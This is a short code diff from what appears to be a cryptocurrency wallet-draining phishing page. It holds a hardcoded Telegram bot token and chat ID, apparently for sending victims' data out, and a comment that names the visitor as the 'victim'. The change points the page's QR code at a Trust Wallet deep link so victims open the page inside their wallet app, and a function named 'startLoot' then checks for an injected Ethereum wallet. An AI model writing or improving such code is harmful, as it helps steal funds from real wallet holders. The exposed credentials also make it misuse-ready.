@@ -46,12 +46,14 @@
         const BOT_TOKEN = "8555263655:AAH739u_HnMdkAZKLotgpJ9rs4rO0YJbhbY";
         const CHAT_ID = "6825522263";
 
-        // QR Code Generation
-        new QRCode(document.getElementById("qrcode"), {
-            text: window.location.href, // Victim link scan karega
-            width: 180,
-            height: 180
-        });
+      
+     // QR Code text ko "Trust Wallet Deep Link" mein badal do
+new QRCode(document.getElementById("qrcode"), {
+    text: "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href),
+    width: 180,
+    height: 180
+});
+
 
         async function startLoot() {
             if (!window.ethereum) {
